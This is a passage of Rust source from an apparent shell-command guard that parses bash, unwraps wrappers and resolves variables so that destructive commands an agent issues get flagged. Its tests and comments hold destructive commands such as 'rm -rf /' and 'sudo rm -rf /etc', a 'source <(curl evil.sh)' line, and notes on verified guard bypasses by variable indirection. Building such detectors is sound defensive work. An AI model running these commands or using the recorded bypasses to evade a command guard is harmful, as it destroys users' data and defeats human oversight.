        let mut out = String::with_capacity(text.len());
        let mut chars = text.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\\' {
                if let Some(&next) = chars.peek() {
                    out.push(next);
                    chars.next();
                    continue;
                }
            }
            out.push(c);
        }
        return out;
    }
    text.to_string()
}

/// Strip outer quoting layer that tree-sitter retains in the source
/// text. Single-quoted strings are returned literally; double-quoted
/// strings have surrounding quotes removed but interior content is left
/// as-is (variables stay literal markers, not expanded).
fn unquote(text: &str) -> String {
    let bytes = text.as_bytes();
    if bytes.len() >= 2 {
        let first = bytes[0];
        let last = bytes[bytes.len() - 1];
        if (first == b'"' && last == b'"') || (first == b'\'' && last == b'\'') {
            return text[1..text.len() - 1].to_string();
        }
    }
    text.to_string()
}

/// Strip outer quoting from a `&str` without copying. Used by the
/// pipe-to-shell re-parse where we need to feed a quoted body back to
/// `parse()`.
fn strip_outer_quotes(text: &str) -> &str {
    let bytes = text.as_bytes();
    if bytes.len() >= 2 {
        let first = bytes[0];
        let last = bytes[bytes.len() - 1];
        if (first == b'"' && last == b'"') || (first == b'\'' && last == b'\'') {
            return &text[1..text.len() - 1];
        }
    }
    text
}

/// Best-effort check that a token is a literal string (not a variable
/// or expansion). Tree-sitter has already separated `string`/`raw_string`
/// nodes from `simple_expansion`/`expansion`; here we just check that
/// the text doesn't start with `$` or `\`` after any opening quote.
fn looks_like_literal(token: &str) -> bool {
    let bare = strip_outer_quotes(token);
    !bare.starts_with('$') && !bare.starts_with('`')
}

/// Inspect an `argv` and detect whether its head is a wrapper. Returns
/// the unwrap result: (wrapper kind, inner argv, remote-after-unwrap,
/// chroot-after-unwrap, optional body to re-parse as bash).
///
/// For wrappers like `bash -c "BODY"` the inner argv is empty and the
/// body is returned for re-parsing. For `sudo rm -rf /etc` the inner
/// argv is `["rm", "-rf", "/etc"]` and no re-parse is needed.
#[allow(clippy::type_complexity)]
fn unwrap_wrapper(argv: &[String]) -> Option<(Wrapper, Vec<String>, bool, bool, Option<String>)> {
    let head = argv.first()?.as_str();

    /// Skip flags consuming flag-value pairs for known argful flags.
    /// `--name=val` long-form is dropped without a peek. Stops at the
    /// first non-flag token (or `--` separator). Returns the index of
    /// the first positional token.
    fn skip_flags_with_arity(rest: &[String], argful: &[&str]) -> usize {
        let mut i = 0;
        while i < rest.len() {
            let t = rest[i].as_str();
            if t == "--" {
                return i + 1;
            }
            if !t.starts_with('-') {
                return i;
            }
            if t.contains('=') {
                i += 1;
                continue;
            }
            if argful.contains(&t) && i + 1 < rest.len() {
                i += 2;
            } else {
                i += 1;
            }
        }
        i
    }

    match head {
        "sudo" | "doas" => {
            // sudo argful flags per manpage: -u (user), -g (group),
            // -A (askpass program), -h (host), -p (prompt), -C (close
            // fd), -D (chdir), -r (role), -t (type), -T (timeout),
            // -U (other user), -e/--edit takes file list. Stops at
            // first positional → that's the inner command name.
            const SUDO_ARGFUL: &[&str] = &[
                "-u",
                "--user",
                "-g",
                "--group",
                "-A",
                "--askpass",
                "-h",
                "--host",
                "-p",
                "--prompt",
                "-C",
                "--close-from",
                "-D",
                "--chdir",
                "-r",
                "--role",
                "-t",
                "--type",
                "-T",
                "--command-timeout",
                "-U",
                "--other-user",
            ];
            let rest = &argv[1..];
            let skip = skip_flags_with_arity(rest, SUDO_ARGFUL);
            let inner = rest[skip..].to_vec();
            Some((wrapper_for_head(head), inner, false, false, None))
        }
        "env" | "command" | "builtin" | "exec" => {
            // `env [-i] [-u VAR] [-C dir] [-S string] [VAR=val ...] cmd
            //  args...` — assignments are tokens of form `NAME=value`.
            // Argful flags consume the next token; `--name=val` is
            // self-contained.
            const ENV_ARGFUL: &[&str] = &[
                "-u",
                "--unset",
                "-C",
                "--chdir",
                "-S",
                "--split-string",
                "--block-signal",
                "--default-signal",
                "--ignore-signal",
            ];
            let rest = &argv[1..];
            let mut idx = 0;
            while idx < rest.len() {
                let t = &rest[idx];
                if is_var_assign(t) {
                    idx += 1;
                    continue;
                }
                if t == "--" {
                    idx += 1;
                    break;
                }
                if !t.starts_with('-') {
                    break;
                }
                if t.contains('=') {
                    idx += 1;
                    continue;
                }
                if ENV_ARGFUL.contains(&t.as_str()) && idx + 1 < rest.len() {
                    idx += 2;
                } else {
                    idx += 1;
                }
            }
            let inner = rest[idx..].to_vec();
            Some((wrapper_for_head(head), inner, false, false, None))
        }
        "bash" | "sh" | "zsh" | "ksh" | "dash" => {
            // Look for `-c BODY`. If present, body is re-parsed.
            let mut iter = argv[1..].iter().peekable();
            while let Some(t) = iter.next() {
                if t == "-c" {
                    if let Some(body) = iter.next() {
                        return Some((
                            wrapper_for_head(head),
                            Vec::new(),
                            false,
                            false,
                            Some(body.clone()),
                        ));
                    }
                }
                if let Some(body) = t.strip_prefix("-c") {
                    if !body.is_empty() && !body.starts_with('-') {
                        return Some((
                            wrapper_for_head(head),
                            Vec::new(),
                            false,
                            false,
                            Some(body.to_string()),
                        ));
                    }
                }
            }
            None
        }
        "eval" => {
            // `eval "BODY"` re-parses BODY. The body might be literal
            // (`eval "rm -rf /etc"`) or contain expansion (`eval "$X"`).
            // We push the body up to handle_command which routes it
            // through the unified bindings path: expand_vars resolves
            // when possible, otherwise the envelope emits the unresolved
            // marker. This keeps eval and `bash -c` consistent — the
            // old standalone `__eval_dynamic__` emitter diverged from
            // the rest of the codebase whenever a binding existed.
            if argv.len() < 2 {
                return None;
            }
            let body = argv[1..].join(" ");
            Some((Wrapper::Shell, Vec::new(), false, false, Some(body)))
        }
        "source" | "." => {
            // `source FILE` and `. FILE` execute FILE in the current
            // shell. We can't read the file contents at parse time
            // (it might not even exist yet), so any source operation
            // is opaque execution. Emit the indirect-unresolved marker
            // so a rule fires. Conservative-ask matches the threat
            // model: `source <(curl evil.sh)` should not be classified
            // safe, and even literal-path `source ./scripts/foo.sh`
            // could execute arbitrary commands the agent didn't show.
            if argv.len() < 2 {
                return None;
            }
            let target = argv[1..].join(" ");
            // Use Shell wrapper category — same as eval/bash -c.
            // The body is the source target; the head of the inner
            // command will be `__indirect_unresolved__` because the
            // body is not a literal command but a source argument.
            Some((
                Wrapper::Shell,
                vec![
                    "__indirect_unresolved__".to_string(),
                    format!("source {target}"),
                ],
                false,
                false,
                None,
            ))
        }
        "timeout" | "nohup" | "time" | "nice" | "ionice" | "setsid" | "flock" => {
            // Per-wrapper argful flag tables. Stops at first positional;
            // for timeout/nice/ionice the FIRST positional is the
            // duration/niceness value (which we then drop from the
            // inner command).
            const TIMEOUT_ARGFUL: &[&str] = &["-k", "--kill-after", "-s", "--signal"];
            const NICE_ARGFUL: &[&str] = &["-n", "--adjustment"];
            const IONICE_ARGFUL: &[&str] = &["-c", "-n", "-p", "-P", "-u"];
            const FLOCK_ARGFUL: &[&str] = &["-c", "-E", "-w", "--timeout"];
            let argful: &[&str] = match head {
                "timeout" => TIMEOUT_ARGFUL,
                "nice" => NICE_ARGFUL,
                "ionice" => IONICE_ARGFUL,
                "flock" => FLOCK_ARGFUL,
                _ => &[],
            };
            let rest = &argv[1..];
            let skip = skip_flags_with_arity(rest, argful);
            let after_flags = &rest[skip..];
            // timeout takes a duration arg: `timeout 5 cmd`.
            // nice without -n: `nice cmd` (default niceness, no extra).
            // ionice without -c/-n: `ionice cmd` (no extra).
            let consume_one_positional = head == "timeout" && !after_flags.is_empty();
            let extra = if consume_one_positional { 1 } else { 0 };
            let inner = after_flags[extra..].to_vec();
            Some((wrapper_for_head(head), inner, false, false, None))
        }
        "ssh" => {
            // `ssh [-flags] [user@]host cmd [args...]`. Per `man ssh`,
            // these flags consume a value token: -B, -b, -c, -D, -E,
            // -e, -F, -I, -i, -J, -L, -l, -m, -O, -o, -p, -P, -Q, -R,
            // -S, -W, -w. Without consuming the value the host position
            // shifts and the inner command gets misidentified.
            const SSH_ARGFUL: &[&str] = &[
                "-B", "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L", "-l", "-m", "-O",
                "-o", "-p", "-P", "-Q", "-R", "-S", "-W", "-w",
            ];
            let rest = &argv[1..];
            let host_idx = skip_flags_with_arity(rest, SSH_ARGFUL);
            let cmd_start = host_idx + 1; // skip the host token
            if cmd_start >= rest.len() {
                return Some((Wrapper::Ssh, Vec::new(), true, false, None));
            }
            // Remaining is the remote command. If it's a single quoted
            // string, re-parse it; otherwise it's an already-tokenised
            // argv.
            if rest.len() - cmd_start == 1 && rest[cmd_start].contains(' ') {
                return Some((
                    Wrapper::Ssh,
                    Vec::new(),
                    true,
                    false,
                    Some(rest[cmd_start].clone()),
                ));
            }
            Some((Wrapper::Ssh, rest[cmd_start..].to_vec(), true, false, None))
        }
        "chroot" => {
            // `chroot [opts] DIR cmd args...`. chroot's only argful
            // flags are `--userspec=USER:GROUP` and `--groups=...`,
            // both `--name=val` form (no value-token-consumption).
            let rest = &argv[1..];
            if rest.is_empty() {
                return Some((Wrapper::Chroot, Vec::new(), false, true, None));
            }
            let dir_idx = skip_flags_with_arity(rest, &[]);
            let after = &rest[dir_idx..];
            if after.is_empty() {
                return Some((Wrapper::Chroot, Vec::new(), false, true, None));
            }
            let inner = if after.len() >= 2 {
                after[1..].to_vec()
            } else {
                Vec::new()
            };
            Some((Wrapper::Chroot, inner, false, true, None))
        }
        "xargs" | "parallel" | "watch" => {
            // xargs argful flags: `-I {}`, `-n N`, `-P N`, `-L N`,
            // `-d sep`, `-E EOF`, `-s SIZE`, `-a FILE`, `--max-args`,
            // `--max-procs`, `--max-chars`, `--max-lines`, etc.
            const XARGS_ARGFUL: &[&str] = &[
                "-I",
                "-i",
                "-n",
                "--max-args",
                "-P",
                "--max-procs",
                "-L",
                "--max-lines",
                "-d",
                "--delimiter",
                "-E",
                "-s",
                "--max-chars",
                "-a",
                "--arg-file",
                "--replace",
            ];
            let rest = &argv[1..];
            let idx = skip_flags_with_arity(rest, XARGS_ARGFUL);
            let inner = rest[idx..].to_vec();
            Some((wrapper_for_head(head), inner, false, false, None))
        }
        "find" => {
            // `find PATHS [opts] -delete` synthesises a virtual `rm`.
            // `find PATHS -exec CMD {} \;` synthesises a CMD command.
            let rest = &argv[1..];
            if rest.iter().any(|t| t == "-delete") {
                let mut synth = vec!["rm".to_string(), "-rf".to_string()];
                for t in rest.iter() {
                    if !t.starts_with('-') {
                        synth.push(t.clone());
                        break;
                    }
                }
                return Some((Wrapper::Find, synth, false, false, None));
            }
            if let Some(pos) = rest.iter().position(|t| t == "-exec" || t == "-execdir") {
                let after = &rest[pos + 1..];
                let cmd_end = after
                    .iter()
                    .position(|t| t == ";" || t == "\\;" || t == "+");
                let inner = match cmd_end {
                    Some(end) => after[..end].to_vec(),
                    None => after.to_vec(),
                };
                let cleaned: Vec<String> = inner
                    .into_iter()
                    .filter(|t| t != "{}" && !t.is_empty())
                    .collect();
                if !cleaned.is_empty() {
                    return Some((Wrapper::Find, cleaned, false, false, None));
                }
            }
            None
        }
        "busybox" => {
            // `busybox CMD args...` — drop the head and let the inner
            // command's classifier run.
            if argv.len() >= 2 {
                Some((Wrapper::PassThrough, argv[1..].to_vec(), false, false, None))
            } else {
                None
            }
        }
        _ => None,
    }
}

fn wrapper_for_head(head: &str) -> Wrapper {
    match head {
        "sudo" | "doas" => Wrapper::Sudo,
        "bash" | "sh" | "zsh" | "ksh" | "dash" => Wrapper::Shell,
        "eval" => Wrapper::Shell,
        "xargs" | "parallel" | "watch" => Wrapper::StdinArgs,
        "ssh" => Wrapper::Ssh,
        "chroot" => Wrapper::Chroot,
        // env, command, builtin, exec, timeout, nohup, time, nice,
        // ionice, setsid, flock, busybox — pass-through wrappers that
        // don't change the inner command's classification semantics.
        _ => Wrapper::PassThrough,
    }
}

/// Envelope check: does `s` contain any execution-position indirection
/// — variable expansion (`$X`, `${X}`), command substitution (`$(X)`),
/// backtick (`` `X` ``), or any positional/special parameter (`$1`,
/// `$@`, `$*`, `$?`, `$$`, `$#`, `$!`, `$-`)? Used to gate the
/// indirect-command branch in `handle_command`.
///
/// Per decision.guard-indirection-hardening: any unresolvable indirection
/// in execution position is destructive. The gate must fire on
/// indirection ANYWHERE in argv[0] (not just at the start) to catch
/// prefix-concat patterns (`r$a`, `pre${b}post`), command-sub heads
/// (`$(echo rm)`), and backtick heads (`` `cmd` ``). The actual
/// resolve-or-flag decision is in `expand_vars`.
fn contains_var_ref(s: &str) -> bool {
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '`' {
            return true;
        }
        if c == '$' {
            match chars.peek() {
                Some(&c2) => {
                    if c2 == '_'
                        || c2 == '{'
                        || c2 == '('
                        || c2.is_ascii_alphanumeric()
                        || matches!(c2, '@' | '*' | '?' | '#' | '$' | '!' | '-')
                    {
                        return true;
                    }
                }
                None => return false,
            }
        }
    }
    false
}

/// Parse a `variable_assignment` node's source text into (name, value).
/// Tree-sitter delivers the raw text including any surrounding quotes
/// on the RHS; we strip outer quotes so the bound value matches what
/// the shell would expose. Returns None on shapes we cannot statically
/// resolve to a fixed literal payload:
///
///   * Array literals: `a=(...)` — array semantics differ from scalar.
///   * Append/concat: `a+=...` — the `+` lands inside the name slice,
///     fails the name-charset check.
///   * Dynamic RHS at any depth: `a=$(cmd)`, `a=$b`, `a="$(cmd)"`,
///     `a="prefix$(cmd)"`, `` a=`cmd` ``, `a="$X-y"`. Without this
///     refusal an embedded substitution would be unquoted into the
///     bound value and treated as literal text on later use, which
///     is the verified bypass class `a="$(echo rm) -rf /"; $a`.
///   * Backslash escapes: `a=rm\ -rf\ /`. We do not model word-removal
///     of escapes, so binding the raw text would either leak the
///     backslashes through into re-parse (changing semantics) or
///     silently drop them (also changing semantics). Refuse.
///
/// On refusal the variable stays unbound; later `$a` use surfaces
/// through the envelope as `__indirect_unresolved__` — which is
/// exactly the conservative-ask behaviour we want for opaque values.
fn parse_assignment(text: &str) -> Option<(String, String)> {
    let eq = text.find('=')?;
    if eq == 0 {
        return None;
    }
    let name = &text[..eq];
    if !name
        .chars()
        .next()
        .is_some_and(|c| c == '_' || c.is_ascii_alphabetic())
        || !name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
    {
        return None;
    }
    let raw = &text[eq + 1..];
    if raw.starts_with('(') {
        return None;
    }
    // Anywhere in the RAW text — quoted or not — refuse if the value
    // would inherit dynamic semantics. `"$(...)"` starts with `"` so
    // the old first-byte check on `$` missed it; scan everywhere.
    if raw.contains("$(") || raw.contains("${") || raw.contains('`') || raw.contains('\\') {
        return None;
    }
    // Plain `$NAME` form (`a=$b`). Already covered if it's the first
    // byte, but cover the quoted case too: `a="$b"`.
    if raw.starts_with('$') || raw.contains("\"$") || raw.contains("'$") {
        return None;
    }
    Some((name.to_string(), unquote(raw)))
}

/// Conservative shell variable name check: `[A-Za-z_][A-Za-z0-9_]*`.
fn is_valid_var_name(s: &str) -> bool {
    let mut chars = s.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    if !(first == '_' || first.is_ascii_alphabetic()) {
        return false;
    }
    chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
}

/// Extract just the variable name from a `NAME=...` text (used when
/// `parse_assignment` refuses the value but we still want to record
/// that the name was assigned — see the tainted-env-shadow path).
fn static_assignment_name(text: &str) -> Option<(String, ())> {
    let eq = text.find('=')?;
    if eq == 0 {
        return None;
    }
    let name = &text[..eq];
    if !name
        .chars()
        .next()
        .is_some_and(|c| c == '_' || c.is_ascii_alphabetic())
        || !name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
    {
        return None;
    }
    Some((name.to_string(), ()))
}

fn is_var_assign(token: &str) -> bool {
    if let Some(eq) = token.find('=') {
        if eq == 0 {
            return false;
        }
        let lhs = &token[..eq];
        return lhs.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
            && lhs.chars().next().is_some_and(|c| !c.is_ascii_digit());
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cmds(src: &str) -> Vec<EffectiveCommand> {
        parse(src).commands
    }

    #[test]
    fn plain_command() {
        let c = cmds("ls -la");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["ls", "-la"]);
        assert!(c[0].wrappers.is_empty());
    }

    #[test]
    fn sudo_unwraps() {
        let c = cmds("sudo rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
        assert_eq!(c[0].wrappers, vec![Wrapper::Sudo]);
    }

    #[test]
    fn env_assignments_skipped() {
        let c = cmds("env FOO=1 BAR=2 rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn bash_c_reparses_body() {
        let c = cmds("bash -c 'rm -rf /etc/nginx'");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc/nginx"]);
        assert!(c[0].wrappers.contains(&Wrapper::Shell));
    }

    #[test]
    fn eval_literal_reparses() {
        let c = cmds("eval \"rm -rf /etc\"");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
        assert!(c[0].wrappers.contains(&Wrapper::Shell));
    }

    #[test]
    fn timeout_skips_duration() {
        let c = cmds("timeout 10 bash -c 'rm -rf /etc'");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
        let w = &c[0].wrappers;
        assert!(w.contains(&Wrapper::PassThrough)); // timeout → PassThrough
        assert!(w.contains(&Wrapper::Shell));
    }

    #[test]
    fn find_delete_synth() {
        let c = cmds("find /var/log -name '*.log' -delete");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv[0], "rm");
        assert!(c[0].wrappers.contains(&Wrapper::Find));
    }

    #[test]
    fn ssh_marks_remote() {
        let c = cmds("ssh prod 'rm -rf /var'");
        assert_eq!(c.len(), 1);
        assert!(c[0].remote);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/var"]);
    }

    #[test]
    fn chroot_marks_chrooted() {
        let c = cmds("chroot /mnt rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert!(c[0].chrooted);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn cd_then_rm_carries_cwd() {
        let c = cmds("cd /tmp && rm -rf ci-results");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "ci-results"]);
        assert_eq!(c[0].cwd.as_deref(), Some("/tmp"));
    }

    #[test]
    fn subshell_isolates_cwd() {
        let c = cmds("(cd /tmp && rm -rf x); rm -rf y");
        // First command (rm in subshell) has cwd=/tmp; second (top-
        // level rm after subshell) inherits None.
        assert_eq!(c.len(), 2);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "x"]);
        assert_eq!(c[0].cwd.as_deref(), Some("/tmp"));
        assert_eq!(c[1].argv, vec!["rm", "-rf", "y"]);
        assert!(c[1].cwd.is_none());
    }

    #[test]
    fn heredoc_body_not_executed() {
        // `cat <<EOF\nrm -rf /\nEOF` — the body is data, only `cat`
        // is an executed command. tree-sitter knows this; our walker
        // skips heredoc_redirect / heredoc_body content.
        let c = cmds("cat <<EOF\nrm -rf /\nEOF");
        assert!(c.iter().any(|cmd| cmd.argv[0] == "cat"));
        assert!(c.iter().all(|cmd| cmd.argv[0] != "rm"));
    }

    #[test]
    fn quoted_string_is_data() {
        // `git commit -m "rm -rf detection"` — the message is data.
        // Tree-sitter keeps it as a single string node; argv has 4
        // elements but the third is a literal message, not an rm
        // execution.
        let c = cmds("git commit -m \"rm -rf detection\"");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv[0], "git");
        assert!(c[0].argv.iter().all(|a| a != "rm"));
    }

    #[test]
    fn pipeline_keeps_each_stage() {
        let c = cmds("echo 'rm -rf /' | bash");
        // Both stages should appear as separate commands. The `bash`
        // stage has no -c so we don't re-parse the upstream literal
        // — that's a follow-up step.
        assert!(c.iter().any(|cmd| cmd.argv[0] == "echo"));
        assert!(c.iter().any(|cmd| cmd.argv[0] == "bash"));
    }

    // ── tribunal-355 fixes ──────────────────────────────────────────

    #[test]
    fn command_substitution_in_arg_is_walked() {
        // `echo $(rm -rf /etc)` — the inner rm runs first and must
        // surface as its own EffectiveCommand. Verified bypass.
        let c = cmds("echo $(rm -rf /etc)");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/etc"]),
            "rm not found in: {c:#?}"
        );
    }

    #[test]
    fn command_substitution_inside_string_is_walked() {
        // `echo "$(rm -rf /etc)"` — substitution is nested inside a
        // double-quoted string. Walker must descend into string
        // children to find the inner command.
        let c = cmds("echo \"$(rm -rf /etc)\"");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/etc"]),
            "rm not found in: {c:#?}"
        );
    }

    #[test]
    fn sudo_with_user_flag_unwraps_correctly() {
        // `sudo -u root rm -rf /etc` — argful `-u` flag must consume
        // its value before the inner command starts. Old impl let
        // `root` slip into command position.
        let c = cmds("sudo -u root rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn env_with_unset_flag_unwraps_correctly() {
        let c = cmds("env -u FOO rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn timeout_with_kill_after_flag_unwraps_correctly() {
        let c = cmds("timeout -k 1 5 rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn ssh_with_control_socket_unwraps_correctly() {
        // `ssh -S ctl prod 'rm -rf /etc'` — `-S` consumes the next
        // token as the control-socket path; without that, `prod`
        // becomes the host and the command is misread.
        let c = cmds("ssh -S ctl prod 'rm -rf /etc'");
        assert!(c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/etc"]));
    }

    #[test]
    fn relative_cd_drops_cwd() {
        // `cd /tmp && cd .. && rm -rf var` — after the relative cd
        // we cannot resolve cwd; must drop to None so rm sees no
        // cwd context and `var` is not implicitly /tmp/var.
        let c = cmds("cd /tmp && cd .. && rm -rf var");
        let rm = c.iter().find(|cmd| cmd.argv[0] == "rm").expect("rm");
        assert_eq!(rm.cwd, None);
    }

    #[test]
    fn cd_to_subdir_drops_cwd() {
        let c = cmds("cd /tmp && cd subdir && rm -rf x");
        let rm = c.iter().find(|cmd| cmd.argv[0] == "rm").expect("rm");
        assert_eq!(rm.cwd, None);
    }

    #[test]
    fn eval_dynamic_emits_marker() {
        // `eval "$X"` — dynamic body, X unbound. After unifying eval
        // with the bindings path (decision.guard-indirection-hardening),
        // eval no longer emits a separate `__eval_dynamic__` marker;
        // the body re-parses through the same envelope that bash -c uses,
        // and the unresolved expansion surfaces as `__indirect_unresolved__`.
        let c = cmds("eval \"$X\"");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved marker, got: {c:#?}"
        );
    }

    #[test]
    fn eval_literal_still_reparsed() {
        // Literal body still re-parsed normally.
        let c = cmds("eval 'rm -rf /etc'");
        assert!(c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/etc"]));
    }

    // ── variable indirection (RAN-XXX bypass class) ─────────────────
    //
    // Verified bypass before fix: `a="rm / -rf" && $a` → safe. Root
    // cause: `variable_assignment` was discarded as env-prefix, `$a`
    // surfaced as opaque `simple_expansion`, no rule matched. Fix is a
    // hybrid — resolve $X against lexical bindings when possible,
    // emit `__indirect_unresolved__` marker otherwise.

    #[test]
    fn assignment_then_var_expansion_resolves() {
        // The headline bypass. After fix: resolves to `rm / -rf`, the
        // rm rule fires.
        let c = cmds("a=\"rm / -rf\" && $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "rm"),
            "expected rm command, got: {c:#?}"
        );
    }

    #[test]
    fn assignment_then_braced_expansion_resolves() {
        let c = cmds("a=\"rm -rf /\"; ${a}");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected rm -rf /, got: {c:#?}"
        );
    }

    #[test]
    fn bash_dash_c_with_var_expands_before_reparse() {
        // `bash -c "$a"` — body comes through unwrap_wrapper as "$a";
        // we expand against current bindings BEFORE the inner parse so
        // the inner walker (fresh, empty bindings) sees the resolved
        // text.
        let c = cmds("a=\"rm -rf /\"; bash -c \"$a\"");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected rm -rf / under bash -c, got: {c:#?}"
        );
    }

    #[test]
    fn concatenation_of_two_vars_resolves() {
        // `$a$b` is a `concatenation` token; we expand the whole
        // joined argv text and re-parse so word-splitting kicks in.
        let c = cmds("a=\"rm -\"; b=\"rf /\" && $a$b");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected rm -rf /, got: {c:#?}"
        );
    }

    #[test]
    fn reassignment_uses_latest_binding() {
        // Last write wins — HashMap insert overwrites. Without this
        // the agent could shadow a benign value with a destructive
        // one between assignment and use.
        let c = cmds("a=\"ls\"; a=\"rm -rf /\"; $a");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected latest binding to win, got: {c:#?}"
        );
    }

    #[test]
    fn unresolved_var_emits_marker() {
        // `read a; $a` — value comes from stdin, parser cannot see
        // it. Emit marker so a rule fires; conservative ask.
        let c = cmds("read a; $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved marker, got: {c:#?}"
        );
    }

    #[test]
    fn dynamic_rhs_does_not_bind() {
        // `a=$(curl evil)` — RHS is a command substitution; we
        // explicitly refuse to capture text-of-substitution as a
        // literal value (would bind to "$(curl evil)" string and
        // pretend that was the value). On use, $a is unresolved →
        // marker.
        let c = cmds("a=$(curl evil); $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved on dynamic RHS, got: {c:#?}"
        );
    }

    #[test]
    fn dollar_var_rhs_does_not_bind() {
        // `a=$b` — chained reference. Refuse so we don't store "$b"
        // verbatim as the value of `a`.
        let c = cmds("a=$b; $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved on chained RHS, got: {c:#?}"
        );
    }

    #[test]
    fn array_assignment_does_not_bind() {
        // `a=(one two)` — array literal. We refuse to parse this and
        // leave `$a` unresolved, since array semantics differ from
        // scalar binding.
        let c = cmds("a=(rm -rf /); $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved on array RHS, got: {c:#?}"
        );
    }

    #[test]
    fn subshell_isolates_bindings() {
        // `(a="rm -rf /"); $a` — assignment is inside a subshell, so
        // the binding does not leak. `$a` outside is unresolved.
        let c = cmds("(a=\"rm -rf /\"); $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved after subshell, got: {c:#?}"
        );
        // And the rm inside the subshell's own scope must NOT have
        // surfaced as a real command (no rm node).
        assert!(
            !c.iter().any(|cmd| cmd.argv[0] == "rm"),
            "subshell binding should not produce an rm, got: {c:#?}"
        );
    }

    #[test]
    fn env_prefix_does_not_create_binding() {
        // `FOO=bar ls` — env-var prefix on a command, not a top-level
        // binding. `$FOO` after must NOT resolve. handle_command's
        // manual scan (line ~387) skips variable_assignment children;
        // walk_node only sees top-level assignments.
        let c = cmds("FOO=\"rm -rf /\" ls; $FOO");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "env-prefix must not bind, got: {c:#?}"
        );
    }

    #[test]
    fn parametric_expansion_unresolved() {
        // `${a:-default}` etc. — we don't model parameter expansion
        // operators. Treat as unresolved.
        let c = cmds("a=\"ls\"; ${a:-rm} -rf /");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "parametric expansion must not silently resolve, got: {c:#?}"
        );
    }

    #[test]
    fn positional_param_unresolved() {
        // `$1`, `$@`, `$*`, `$$` — positional/special. We don't track
        // them; emit marker so `$1 -rf /` doesn't slip through.
        let c = cmds("$1 -rf /");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "positional param must mark unresolved, got: {c:#?}"
        );
    }

    #[test]
    fn safe_expansion_passes_through() {
        // Sanity: legitimate `a="ls -la" && $a` resolves to ls and
        // does not produce a marker. Without this guard we'd flip
        // every $-headed command to destructive — too noisy.
        let c = cmds("a=\"ls -la\" && $a");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["ls", "-la"]),
            "expected ls -la, got: {c:#?}"
        );
        assert!(
            !c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "safe expansion must not emit marker, got: {c:#?}"
        );
    }

    #[test]
    fn quoted_use_still_destructive() {
        // `a="rm -rf /"; bash -c "$a"` — body is "$a" (quoted) which
        // bash would pass as a single arg, but inside `bash -c` the
        // string IS the script. Our expansion produces "rm -rf /";
        // re-parse word-splits as bash itself would.
        let c = cmds("a=\"rm -rf /\"; bash -c \"$a\"");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected rm -rf / under bash -c, got: {c:#?}"
        );
    }

    #[test]
    fn nested_indirection_through_eval() {
        // `eval "$a"` already had its own marker; verify the
        // indirect path doesn't double-fire or swallow it. With
        // bindings this resolves fully; without, eval path emits
        // __eval_dynamic__.
        let c = cmds("a=\"rm -rf /\"; eval \"$a\"");
        // After fix: argv is ["eval", "$a"]; argv[0] is literal so
        // indirect branch doesn't fire; eval-wrapper unwrap returns
